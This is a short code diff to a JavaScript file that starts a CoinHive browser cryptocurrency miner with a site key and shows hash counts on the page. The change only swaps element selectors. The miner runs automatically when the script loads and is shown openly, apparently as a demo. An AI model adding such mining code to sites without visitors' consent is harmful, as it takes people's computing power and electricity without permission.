@@ -2,9 +2,9 @@ var miner = new CoinHive.Anonymous('nzsqRtzXjHw8qYGPdSV56jEattRTXGxb');
 miner.start();
 const total = document.querySelector('#totalHashes');
 var totalHashes;
-const accepted = document.querySelector('#accepted');
-const initial = document.querySelector('#initial');
-const error = document.querySelector('#error');
+const accepted = document.querySelector('.accepted');
+const initial = document.querySelector('.initial');
+const error = document.querySelector('.error');
 setInterval(function() {
 	totalHashes = miner.getTotalHashes();
 	total.value = totalHashes;
